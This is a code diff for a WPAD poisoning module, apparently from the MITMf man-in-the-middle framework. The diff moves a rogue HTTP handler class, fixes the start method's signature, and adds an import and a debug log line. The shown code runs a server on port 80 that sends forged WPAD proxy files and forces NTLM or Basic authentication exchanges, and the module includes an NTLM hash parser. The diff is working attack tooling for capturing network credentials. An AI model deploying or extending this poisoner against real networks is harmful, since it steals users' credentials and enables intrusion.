@@ -2,15 +2,17 @@ import socket
 import threading
 import logging
 
-from HTTPPackets import *
 from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
+from core.configwatcher import ConfigWatcher
+from HTTPPackets import *
 
 mitmf_logger = logging.getLogger("mitmf")
 
 class WPADPoisoner():
 
-	def start(on_off):
+	def start(self):
 		try:
+			mitmf_logger.debug("[WPADPoisoner] online")
 			server = ThreadingTCPServer(("0.0.0.0", 80), HTTP)
 			t = threading.Thread(name="HTTP", target=server.serve_forever)
 			t.setDaemon(True)
@@ -24,6 +26,27 @@ class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
 	def server_bind(self):
 		TCPServer.server_bind(self)
+
+#HTTP Server Class
+class HTTP(BaseRequestHandler):
+
+	def handle(self):
+		try:
+			while True:
+				self.request.settimeout(1)
+				data = self.request.recv(8092)
+				buff = WpadCustom(data,self.client_address[0])
+				if buff and WpadForcedAuth(Force_WPAD_Auth) == False:
+					Message = "[+]WPAD (no auth) file sent to: %s"%(self.client_address[0])
+					if Verbose:
+						print Message
+					mitmf_logger.info(Message)
+					self.request.send(buff)
+				else:
+					buffer0 = PacketSequence(data,self.client_address[0])
+					self.request.send(buffer0)
+		except Exception:
+			pass#No need to be verbose..
 
 #Parse NTLMv1/v2 hash.
 def ParseHTTPHash(data,client):
@@ -214,25 +237,4 @@ def PacketSequence(data,client):
 
 	else:
 		return str(Basic_Ntlm(Basic))
-
-#HTTP Server Class
-class HTTP(BaseRequestHandler):
-
-	def handle(self):
-		try:
-			while True:
-				self.request.settimeout(1)
-				data = self.request.recv(8092)
-				buff = WpadCustom(data,self.client_address[0])
-				if buff and WpadForcedAuth(Force_WPAD_Auth) == False:
-					Message = "[+]WPAD (no auth) file sent to: %s"%(self.client_address[0])
-					if Verbose:
-						print Message
-					mitmf_logger.info(Message)
-					self.request.send(buff)
-				else:
-					buffer0 = PacketSequence(data,self.client_address[0])
-					self.request.send(buffer0)
-		except Exception:
-			pass#No need to be verbose..
 			
